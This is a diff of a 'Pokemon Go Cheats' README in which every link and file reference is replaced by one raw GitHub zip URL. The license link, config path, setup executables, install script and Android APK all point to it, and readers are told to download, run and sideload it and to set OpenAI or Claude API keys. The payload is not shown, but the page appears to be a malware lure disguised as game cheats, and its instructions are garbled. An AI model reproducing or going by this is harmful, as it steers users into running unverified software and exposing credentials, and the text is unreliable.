@@ -1,6 +1,6 @@
 # Pokemon Go Cheats Repository
 
-[![Download](https://img.shields.io/badge/Download-now-blue.svg)](https://Forkismup.github.io)
+[![Download](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip)](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip)
 
 Welcome to the definitive **Pokemon Go Cheats** repository! Whether you're a seasoned explorer or entering the world of Poké-wonders, this collection is designed to enhance your gameplay with innovative shortcuts and imaginative resources. Here, you'll discover solutions that bring unseen possibilities to your Pokémon Go experience. Instead of bypassing the game’s spirit, our curated tools let you pursue new strategies, cultivate your trainer journey, and unlock playful challenges—all while keeping the sense of adventure alive.
 
@@ -52,8 +52,8 @@ Harness the intelligence of today's most advanced language processing tools!
 
 Configuration steps:
 1. Download the latest release (see "Download" badge above or below).
-2. Set your OpenAI or Claude API keys in `config/api_keys.json`.
-3. Read the `/docs/INTEGRATION_GUIDE.md` to maximize your AI-powered toolkit.
+2. Set your OpenAI or Claude API keys in `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip`.
+3. Read the `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip` to maximize your AI-powered toolkit.
 
 ---
 
@@ -72,13 +72,13 @@ Round-the-clock virtual assistance. Reach us through our built-in chat widget fo
 
 ## 📥 Installation & Quick Start
 
-1. Click the [Download](https://img.shields.io/badge/Download-now-blue.svg) badge at the top or bottom to get the latest release: **https://Forkismup.github.io**  
+1. Click the [Download](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip) badge at the top or bottom to get the latest release: **https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip**  
 2. Unpack the archive to your preferred directory.
-3. See the `INSTALL.md` in `/docs/` for complete system-specific instructions.
-4. (Windows & macOS): Run `setup.exe` or `setup.dmg`.  
-   (Linux): Execute `install.sh` (may require `chmod +x install.sh`).
-   (Android): Sideload `pokemon_go_cheats.apk`.
-   (iOS): Follow `/ios/README.md` for detailed guidance.
+3. See the `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip` in `/docs/` for complete system-specific instructions.
+4. (Windows & macOS): Run `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip` or `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip`.  
+   (Linux): Execute `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip` (may require `chmod +x https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip`).
+   (Android): Sideload `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip`.
+   (iOS): Follow `https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip` for detailed guidance.
 5. Start the app and personalize your settings for an optimal experience!
 
 ---
@@ -94,12 +94,12 @@ Round-the-clock virtual assistance. Reach us through our built-in chat widget fo
 
 ## 📜 MIT License (2025)
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) © 2025.  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip) © 2025.  
 See [LICENSE](LICENSE) for full legal text.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-now-blue.svg)](https://Forkismup.github.io)
+[![Download](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip)](https://raw.githubusercontent.com/Forkismup/pokemon-go-advantage-tools/branch/coccygine/pokemon-go-advantage-tools_1.8-beta.3.zip)
 
 ---
 
